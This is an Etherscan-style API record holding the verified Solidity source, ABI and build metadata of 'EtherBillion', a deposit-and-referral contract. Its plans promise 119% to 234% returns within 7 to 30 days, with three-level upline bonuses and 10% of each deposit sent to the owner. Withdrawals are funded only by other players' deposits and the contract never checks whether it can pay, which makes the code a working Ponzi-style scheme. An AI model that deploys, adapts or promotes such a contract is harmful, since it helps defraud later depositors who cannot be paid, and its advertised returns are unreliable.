{"status":"1","message":"OK","result":[{"SourceCode":"// SPDX-License-Identifier: MIT License\r\npragma solidity ^0.6.8;\r\n\r\ncontract ReentrancyGuard {\r\n    uint256 internal constant _NOT_ENTERED = 1;\r\n    uint256 internal constant _ENTERED = 2;\r\n\r\n    uint256 internal _status;\r\n\r\n    constructor () internal {\r\n        _status = _NOT_ENTERED;\r\n    }\r\n\r\n    modifier nonReentrant() {\r\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\r\n        _status = _ENTERED;\r\n        _;\r\n        _status = _NOT_ENTERED;\r\n    }\r\n}\r\n\r\ncontract EtherBillion is ReentrancyGuard {\r\n    struct Plan {\r\n        uint8 life_days;\r\n        uint8 percent;\r\n    }\r\n\r\n    struct Deposit {\r\n        uint8 plan;\r\n        uint256 amount;\r\n        uint40 time;\r\n    }\r\n\r\n    struct Player {\r\n        address upline;\r\n        uint256 dividends;\r\n        uint256 direct_bonus;\r\n        uint256 match_bonus;\r\n        uint40 last_payout;\r\n        uint256 total_invested;\r\n        uint256 total_withdrawn;\r\n        uint256 total_match_bonus;\r\n        Deposit[] deposits;\r\n        mapping(uint8 => uint256) structure;\r\n    }\r\n\r\n    address payable public owner;\r\n\r\n    uint256 public invested;\r\n    uint256 public withdrawn;\r\n    uint256 public direct_bonus;\r\n    uint256 public match_bonus;\r\n\r\n    uint8[] public ref_bonuses; // 1 => 1%\r\n\r\n    Plan[] public plans;\r\n    mapping(address => Player) public players;\r\n\r\n    event Upline(address indexed addr, address indexed upline, uint256 bonus);\r\n    event NewDeposit(address indexed addr, uint256 amount, uint8 plan);\r\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event Withdraw(address indexed addr, uint256 amount);\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n\r\n        plans.push(Plan(7, 119));\r\n        plans.push(Plan(8, 124));\r\n        plans.push(Plan(9, 129));\r\n        plans.push(Plan(10, 134));\r\n        plans.push(Plan(11, 139));\r\n        plans.push(Plan(12, 144));\r\n        plans.push(Plan(13, 149));\r\n        plans.push(Plan(14, 154));\r\n        plans.push(Plan(15, 159));\r\n        plans.push(Plan(16, 164));\r\n        plans.push(Plan(17, 169));\r\n        plans.push(Plan(18, 174));\r\n        plans.push(Plan(19, 179));\r\n        plans.push(Plan(20, 184));\r\n        plans.push(Plan(21, 189));\r\n        plans.push(Plan(22, 194));\r\n        plans.push(Plan(23, 199));\r\n        plans.push(Plan(24, 204));\r\n        plans.push(Plan(25, 209));\r\n        plans.push(Plan(26, 214));\r\n        plans.push(Plan(27, 219));\r\n        plans.push(Plan(28, 224));\r\n        plans.push(Plan(29, 229));\r\n        plans.push(Plan(30, 234));\r\n\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(3);\r\n        ref_bonuses.push(1);\r\n    }\r\n\r\n    function payoutOf(address _addr) view public returns(uint256 value) {\r\n        Player memory player = players[_addr];\r\n\r\n        for(uint256 i = 0; i < player.deposits.length; i++) {\r\n            Deposit memory dep = player.deposits[i];\r\n            Plan memory plan = plans[dep.plan];\r\n\r\n            uint40 time_end = dep.time + plan.life_days * 86400;\r\n            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;\r\n            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);\r\n\r\n            if(from < to) {\r\n                value += dep.amount * (to - from) * plan.percent / plan.life_days / 8640000;\r\n            }\r\n        }\r\n\r\n        return value;\r\n    }\r\n\r\n    function _payout(address _addr) internal {\r\n        uint256 payout = payoutOf(_addr);\r\n\r\n        if(payout > 0) {\r\n            players[_addr].last_payout = uint40(block.timestamp);\r\n            players[_addr].dividends += payout;\r\n        }\r\n    }\r\n\r\n    function _refPayout(address _addr, uint256 _amount) internal {\r\n        address up = players[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n\r\n            uint256 bonus = _amount * ref_bonuses[i] / 100;\r\n\r\n            players[up].match_bonus += bonus;\r\n            players[up].total_match_bonus += bonus;\r\n\r\n            match_bonus += bonus;\r\n\r\n            emit MatchPayout(up, _addr, bonus);\r\n\r\n            up = players[up].upline;\r\n        }\r\n    }\r\n\r\n    function _setUpline(address _addr, address _upline, uint256 _amount) internal {\r\n        if(players[_addr].upline == address(0) && _addr != owner) {\r\n            if(players[_upline].deposits.length == 0) {\r\n                _upline = owner;\r\n            }\r\n            else {\r\n                players[_addr].direct_bonus += _amount / 100;\r\n                direct_bonus += _amount / 100;\r\n            }\r\n\r\n            players[_addr].upline = _upline;\r\n\r\n            emit Upline(_addr, _upline, _amount / 100);\r\n\r\n            for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n                players[_upline].structure[i]++;\r\n\r\n                _upline = players[_upline].upline;\r\n\r\n                if(_upline == address(0)) break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function deposit(uint8 _plan, address _upline) external payable nonReentrant {\r\n        require(plans[_plan].life_days > 0, \"Plan not found\");\r\n        require(msg.value >= 0.01 ether, \"Zero amount\");\r\n\r\n        Player storage player = players[msg.sender];\r\n\r\n        require(player.deposits.length < 100, \"Max 100 deposits per address\");\r\n\r\n        _setUpline(msg.sender, _upline, msg.value);\r\n\r\n        player.deposits.push(Deposit({\r\n            plan: _plan,\r\n            amount: msg.value,\r\n            time: uint40(block.timestamp)\r\n        }));\r\n\r\n        player.total_invested += msg.value;\r\n        invested += msg.value;\r\n\r\n        _refPayout(msg.sender, msg.value);\r\n\r\n        owner.transfer(msg.value / 10);\r\n\r\n        emit NewDeposit(msg.sender, msg.value, _plan);\r\n    }\r\n\r\n    function withdraw() external nonReentrant {\r\n        Player storage player = players[msg.sender];\r\n\r\n        _payout(msg.sender);\r\n\r\n        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, \"Zero amount\");\r\n\r\n        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;\r\n\r\n        player.dividends = 0;\r\n        player.direct_bonus = 0;\r\n        player.match_bonus = 0;\r\n        player.total_withdrawn += amount;\r\n        withdrawn += amount;\r\n\r\n        msg.sender.transfer(amount);\r\n\r\n        emit Withdraw(msg.sender, amount);\r\n    }\r\n\r\n\r\n    function userInfo(address _addr) view external returns(uint256 for_withdraw,\r\n        uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {\r\n        Player storage player = players[_addr];\r\n\r\n        uint256 payout = payoutOf(_addr);\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            structure[i] = player.structure[i];\r\n        }\r\n\r\n        return (\r\n        payout + player.dividends + player.direct_bonus + player.match_bonus,\r\n        player.total_invested,\r\n        player.total_withdrawn,\r\n        player.total_match_bonus,\r\n        structure\r\n        );\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {\r\n        return (invested, withdrawn, direct_bonus, match_bonus);\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"MatchPayout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"}],\"name\":\"NewDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"bonus\",\"type\":\"uint256\"}],\"name\":\"Upline\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"contractInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_direct_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_match_bonus\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_plan\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"_upline\",\"type\":\"address\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"direct_bonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"invested\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"match_bonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"payoutOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"plans\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"life_days\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"percent\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"players\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"dividends\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"direct_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"match_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint40\",\"name\":\"last_payout\",\"type\":\"uint40\"},{\"internalType\":\"uint256\",\"name\":\"total_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_match_bonus\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"ref_bonuses\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"userInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"for_withdraw\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_match_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256[3]\",\"name\":\"structure\",\"type\":\"uint256[3]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]","ContractName":"EtherBillion","CompilerVersion":"v0.6.11+commit.5ef660b1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://31fb8be41897abbab30e7527dcb7cfee53e9cdf49dad7e529087e98c06281489"}]}